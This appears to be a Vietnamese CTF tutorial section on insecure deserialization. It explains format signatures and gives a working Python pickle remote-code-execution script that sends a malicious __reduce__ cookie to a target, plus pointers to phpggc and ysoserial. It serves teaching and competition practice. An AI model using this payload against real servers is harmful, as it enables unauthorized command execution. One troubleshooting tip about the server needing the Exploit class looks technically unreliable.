# Deserialization (mở gói dữ liệu không kiểm tra trước)

"Đóng gói" (serialize) là biến 1 object (1 cục dữ liệu có cấu trúc trong code) thành 1 chuỗi để lưu lại hoặc gửi đi — ví dụ lưu vào cookie, gửi qua mạng. "Mở gói" (deserialize) là đọc chuỗi đó, dựng lại đúng object ban đầu để dùng tiếp. Vấn đề là 1 số cách đóng gói (Python `pickle`, PHP `unserialize`, Java serialization) không chỉ phục hồi dữ liệu thường — chúng còn tự động CHẠY CODE ngay trong lúc mở gói. Nếu server mở gói dữ liệu do bạn gửi lên (qua cookie, token) mà không kiểm tra trước, giống việc bạn nhận 1 hộp quà dán kín ghi "đồ chơi dùng pin" rồi cứ cắm điện theo đúng nhãn ghi, không mở ra xem trước — nếu bên trong thực ra là thứ khác, bạn đã bị điều khiển làm theo ý người gửi mà không biết.

Trên Burp bạn nhận ra lỗi này khi: giải mã base64 giá trị cookie/token hiện tại, thấy chuỗi KHÔNG giống JSON/text bình thường mà có định dạng lạ đặc trưng — PHP serialize bắt đầu bằng `O:` hoặc `a:` (decode base64 ra sẽ thấy `Tzo`/`YTo`), Python pickle thường bắt đầu `gASV`/`gAJ` sau base64, Java bắt đầu byte `ac ed 00 05` (base64: `rO0AB`).

## Snippet copy-là-chạy — ví dụ cụ thể với Python `pickle`

Ví dụ này giả định server có 1 endpoint nhận cookie `state` là 1 object Python đã `pickle` + base64, rồi tự `pickle.loads()` nó mà không kiểm tra. Bạn tự tạo 1 object giả có hàm đặc biệt `__reduce__` — khi Python "mở gói" object này, nó tự động gọi hàm bạn chỉ định.

```python
import base64
import pickle
import re
import requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")


class Exploit:
    # __reduce__ là "cửa sau": pickle gọi nó khi ĐÓNG GÓI object này, và lưu lại
    # thông tin (hàm, tham số) đó -- để khi MỞ GÓI lại, pickle tự gọi đúng hàm đó
    # với đúng tham số đó, không cần ai gọi tường minh.
    def __reduce__(self):
        import os
        # (hàm_sẽ_chạy, (tham_số_truyền_vào,)) -- ở đây chạy lệnh đọc file flag
        return (os.system, ("cat flag.txt > /tmp/leak.txt 2>/dev/null",))


def build_malicious_cookie():
    # Đóng gói object Exploit() thành bytes, rồi base64 để có thể nhét vào cookie (text)
    raw = pickle.dumps(Exploit())
    return base64.b64encode(raw).decode()


def solve_one(session, base_url):
    # Bước 1: tạo payload độc (tính toán cục bộ, KHÔNG gửi request nào ở bước này)
    evil_cookie = build_malicious_cookie()

    # Bước 2: gửi cookie độc lên server -- server sẽ tự pickle.loads() nó
    session.cookies.set("state", evil_cookie)
    r = session.get(f"{base_url}/", timeout=5)

    # Bước 3: tìm flag trong response (nếu lệnh chạy xong có in kết quả ra trang),
    # hoặc gọi thêm 1 endpoint khác đọc file /tmp/leak.txt nếu app có chức năng đó
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else r.text[:300]  # không thấy flag thì in thử để debug


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print(solve_one(s, "http://target"))
```

## Giải thích cho người mới

- `__reduce__` là tên hàm đặc biệt (magic method — hàm được ngôn ngữ tự động gọi ở 1 thời điểm nhất định, không cần bạn gọi tay) mà Python dùng riêng cho việc đóng/mở gói object. Bạn không gọi `os.system(...)` trực tiếp trong code của mình — bạn chỉ trả về 1 tuple `(hàm, (tham_số,))`, và chính quá trình `pickle.loads()` ở PHÍA SERVER sẽ tự gọi hàm đó.
- `pickle.dumps(Exploit())` đóng gói object giả này thành bytes — đây là bước tính toán cục bộ, giống cách sửa JWT ở ví dụ 2 mục 5 trong [`00_Bat_Dau_Tu_Zero.md`](../00_Bat_Dau_Tu_Zero.md): không gửi request, chỉ xử lý chuỗi/bytes trong Python trước khi gửi.
- `base64.b64encode(...)` vì cookie là text, không chứa được byte thô tùy ý — phải mã hoá base64 trước khi nhét vào `session.cookies.set(...)`.
- Vì sao nguy hiểm hơn các lỗi khác: bạn không cần tìm lỗi gì đặc biệt trong code của app — chỉ cần app có dòng `pickle.loads(cookie_của_bạn)` là đủ, vì bạn tự mang theo "quả bom" (object `Exploit`), không cần dựa vào bug có sẵn trong code server.
- Với PHP (`unserialize()`), ý tưởng giống nhau nhưng object giả phải được viết theo cú pháp serialize của PHP, và thường bạn không tự viết tay mà dùng công cụ sinh sẵn (`phpggc`) vì PHP cần ghép nhiều class có sẵn trong framework (gọi là gadget chain) mới dẫn tới chạy lệnh được — việc này phức tạp hơn `pickle` (chỗ Python đơn giản vì bạn tự viết class của mình, PHP phải "mượn" class có sẵn của người khác).

## Lưu ý nhanh

- Nhận diện định dạng TRƯỚC khi tấn công: decode base64 giá trị cookie/token nghi ngờ, so với dấu hiệu của từng ngôn ngữ (PHP: `Tzo`/`YTo`; Python pickle: `gASV`/`gAJ`; Java: `rO0AB`).
- Với Python `pickle`, tự viết `__reduce__()` là đủ, không cần công cụ ngoài. Với PHP/Java, dùng công cụ sinh sẵn (`phpggc` cho PHP, `ysoserial` cho Java) thay vì tự nghiên cứu gadget chain — tự làm tay rất tốn thời gian và dễ sai.
- Class `Exploit` khi unpickle phải tìm lại được đúng tên class ở phía server — nếu lỗi `AttributeError`/`ModuleNotFoundError` khi server cố mở gói, thử đặt class trong module `__main__` hoặc đúng tên module mà server có thể import.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
